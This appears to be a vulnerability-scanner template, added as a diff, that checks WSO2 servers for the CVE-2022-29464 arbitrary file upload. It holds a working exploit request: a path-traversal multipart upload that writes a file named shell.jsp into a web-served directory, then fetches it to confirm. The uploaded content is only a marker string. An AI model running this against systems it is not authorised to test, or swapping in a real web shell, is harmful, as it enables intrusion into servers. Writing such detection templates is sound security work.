@@ -1,0 +1,44 @@
+id: WSO2-upload
+
+info:
+  name: WSO2任意文件上传
+  author: str1am
+  severity: critical
+  reference:
+    - https://github.com/hakivvi/CVE-2022-29464/blob/main/exploit.py
+  tags: WSO2,upload
+
+requests:
+  - raw:
+      - |
+        POST /fileupload/toolsAny HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 300
+        Content-Type: multipart/form-data; boundary=7e4e89afc5a9aee581a5ab27fc7abf8f
+
+        --7e4e89afc5a9aee581a5ab27fc7abf8f
+        Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/shell.jsp"; filename="../../../../repository/deployment/server/webapps/authenticationendpoint/shell.jsp"
+
+
+        202cb962ac59075b964b07152d234b70
+
+        --7e4e89afc5a9aee581a5ab27fc7abf8f--
+
+      - |
+        GET /authenticationendpoint/shell.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        part: body
+        condition: and
